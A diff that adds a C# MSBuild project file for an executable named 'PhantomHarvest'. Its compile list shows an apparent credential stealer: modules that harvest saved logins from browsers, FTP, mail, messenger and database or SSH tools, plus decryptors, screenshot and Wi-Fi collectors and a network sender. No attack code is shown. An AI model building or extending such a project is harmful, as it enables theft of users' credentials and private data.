@@ -1,0 +1,113 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+	<Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+	<PropertyGroup>
+		<Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+		<Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+		<ProjectGuid>{D27579B8-6381-4C14-9FEB-3E9073D20B3B}</ProjectGuid>
+		<OutputType>Exe</OutputType>
+		<RootNamespace>PhantomHarvest</RootNamespace>
+		<AssemblyName>PhantomHarvest</AssemblyName>
+		<TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+		<FileAlignment>512</FileAlignment>
+		<Deterministic>true</Deterministic>
+	</PropertyGroup>
+	<PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+		<PlatformTarget>AnyCPU</PlatformTarget>
+		<DebugSymbols>true</DebugSymbols>
+		<DebugType>full</DebugType>
+		<Optimize>false</Optimize>
+		<OutputPath>bin_new\Debug\</OutputPath>
+		<DefineConstants>DEBUG;TRACE</DefineConstants>
+		<ErrorReport>prompt</ErrorReport>
+		<WarningLevel>4</WarningLevel>
+	</PropertyGroup>
+	<PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+		<PlatformTarget>AnyCPU</PlatformTarget>
+		<DebugType>pdbonly</DebugType>
+		<Optimize>true</Optimize>
+		<OutputPath>bin_new\Release\</OutputPath>
+		<DefineConstants>TRACE</DefineConstants>
+		<ErrorReport>prompt</ErrorReport>
+		<WarningLevel>4</WarningLevel>
+	</PropertyGroup>
+	<ItemGroup>
+		<Reference Include="System" />
+		<Reference Include="System.Core" />
+		<Reference Include="System.Drawing" />
+		<Reference Include="System.Management" />
+		<Reference Include="System.Security" />
+		<Reference Include="System.Windows.Forms" />
+		<Reference Include="System.Xml" />
+	</ItemGroup>
+	<ItemGroup>
+		<AppDesigner Include="Properties\" />
+	</ItemGroup>
+	<ItemGroup>
+		<Compile Include="Browsers\BrowserHost.cs" />
+		<Compile Include="Browsers\FireFox.cs" />
+		<Compile Include="Browsers\IE.cs" />
+		<Compile Include="Browsers\OldSogou.cs" />
+		<Compile Include="FTPs\CoreFTP.cs" />
+		<Compile Include="FTPs\FileZilla.cs" />
+		<Compile Include="FTPs\Snowflake.cs" />
+		<Compile Include="FTPs\WinSCP.cs" />
+		<Compile Include="Helper\AesGcm.cs" />
+		<Compile Include="Helper\ArchiveManager.cs" />
+		<Compile Include="Helper\Asn1Der.cs" />
+		<Compile Include="Helper\Asn1DerObject.cs" />
+		<Compile Include="Helper\Bcrypt.cs" />
+		<Compile Include="Helper\Blowfish.cs" />
+		<Compile Include="Helper\ChromeV20Decryptor.cs" />
+		<Compile Include="Helper\DataParser.cs" />
+		<Compile Include="Helper\decryptMoz3DES.cs" />
+		<Compile Include="Helper\HandleStealer.cs" />
+		<Compile Include="Helper\IniLine.cs" />
+		<Compile Include="Helper\LineType.cs" />
+		<Compile Include="Helper\LockedFile.cs" />
+		<Compile Include="Helper\Login.cs" />
+		<Compile Include="Helper\Methods.cs" />
+		<Compile Include="Helper\MozillaPBE.cs" />
+		<Compile Include="Helper\Navicat11Cipher.cs" />
+		<Compile Include="Helper\NetSender.cs" />
+		<Compile Include="Helper\PathDiscovery.cs" />
+		<Compile Include="Helper\Pbkdf2.cs" />
+		<Compile Include="Helper\Pixini.cs" />
+		<Compile Include="Helper\RC4Crypt.cs" />
+		<Compile Include="Helper\SecurityPatch.cs" />
+		<Compile Include="Helper\StringExtensions.cs" />
+		<Compile Include="Helper\StringHelper.cs" />
+		<Compile Include="Helper\TripleDESHelper.cs" />
+		<Compile Include="Helper\Win32Api.cs" />
+		<Compile Include="Mails\Foxmail.cs" />
+		<Compile Include="Mails\MailBird.cs" />
+		<Compile Include="Mails\MailMaster.cs" />
+		<Compile Include="Mails\Outlook.cs" />
+		<Compile Include="Messengers\DingTalk.cs" />
+		<Compile Include="Messengers\Discord.cs" />
+		<Compile Include="Messengers\Enigma.cs" />
+		<Compile Include="Messengers\Line.cs" />
+		<Compile Include="Messengers\QQ.cs" />
+		<Compile Include="Messengers\Skype.cs" />
+		<Compile Include="Messengers\Telegram.cs" />
+		<Compile Include="Program.cs" />
+		<Compile Include="Properties\AssemblyInfo.cs" />
+		<Compile Include="Softwares\NeteaseCloudMusic.cs" />
+		<Compile Include="Softwares\VSCode.cs" />
+		<Compile Include="SystemInfos\InstalledApp.cs" />
+		<Compile Include="SystemInfos\ScreenShot.cs" />
+		<Compile Include="SystemInfos\Wifi.cs" />
+		<Compile Include="Tools\DBeaver.cs" />
+		<Compile Include="Tools\FinalShell.cs" />
+		<Compile Include="Tools\JavaRng.cs" />
+		<Compile Include="Tools\MobaXterm.cs" />
+		<Compile Include="Tools\Navicat.cs" />
+		<Compile Include="Tools\RDCMan.cs" />
+		<Compile Include="Tools\SecureCRT.cs" />
+		<Compile Include="Tools\SQLyog.cs" />
+		<Compile Include="Tools\TortoiseSVN.cs" />
+		<Compile Include="Tools\Xmanager.cs" />
+		<Compile Include="ServiceLib.cs" />
+	</ItemGroup>
+	<Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
